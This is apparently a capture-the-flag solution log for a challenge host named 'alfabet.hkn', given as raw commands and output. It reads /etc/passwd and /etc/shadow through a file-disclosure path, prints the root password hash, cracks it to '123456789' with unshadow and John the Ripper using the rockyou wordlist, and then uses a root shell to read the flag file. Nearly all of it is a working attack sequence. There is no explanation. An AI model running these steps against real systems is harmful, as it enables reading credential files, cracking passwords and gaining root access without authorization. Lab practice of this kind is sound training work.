view-source:http://alfabet.hkn/app/main.c

view-source:http://alfabet.hkn/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin

view-source:http://alfabet.hkn/etc/shadow

root:$6$yVfBpLZpinJp40Y8$2PZ5Gkn6bjqWfQpypoE3Yf/pnf/ukgMPS7GtGdrqya3JcP/qsonqROS4if77u9.FoK0Y62ppdwBdnry4WtAO60:19941:0:99999:7:::
daemon:*:19873:0:99999:7:::
bin:*:19873:0:99999:7:::
sys:*:19873:0:99999:7:::
sync:*:19873:0:99999:7:::
games:*:19873:0:99999:7:::
man:*:19873:0:99999:7:::
lp:*:19873:0:99999:7:::
mail:*:19873:0:99999:7:::
news:*:19873:0:99999:7:::
uucp:*:19873:0:99999:7:::
proxy:*:19873:0:99999:7:::
www-data:*:19873:0:99999:7:::
backup:*:19873:0:99999:7:::
list:*:19873:0:99999:7:::
irc:*:19873:0:99999:7:::
gnats:*:19873:0:99999:7:::
nobody:*:19873:0:99999:7:::
_apt:*:19873:0:99999:7:::
systemd-timesync:*:19941:0:99999:7:::
systemd-network:*:19941:0:99999:7:::
systemd-resolve:*:19941:0:99999:7:::
messagebus:*:19941:0:99999:7:::
sshd:*:19941:0:99999:7:::

unshadow passwd_alfabet shadow_alfabet > unshadow.txt

❯ john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456789        (root)
1g 0:00:00:00 DONE (2025-04-05 18:44) 1.162g/s 1190p/s 1190c/s 1190C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

root@8d34dd1ded55:~# ls
root@8d34dd1ded55:~# ls /
app  boot  etc   lib    lib64   media  opt   root  sbin  sys  usr
bin  dev   home  lib32  libx32  mnt    proc  run   srv   tmp  var
root@8d34dd1ded55:~# ls /app
a.html  d.html                f.html  i.html      k.html  main    o.html  r.html    t.html  w.html  z.html
b.html  du_finder_flaget_her  g.html  index.html  l.html  main.c  p.html  s.html    u.html  x.html
c.html  e.html                h.html  j.html      m.html  n.html  q.html  start.sh  v.html  y.html
root@8d34dd1ded55:~# cat /app/du_finder_flaget_her
DDC{nu_fandt_du_min_fil}root@8d34dd1ded55:~#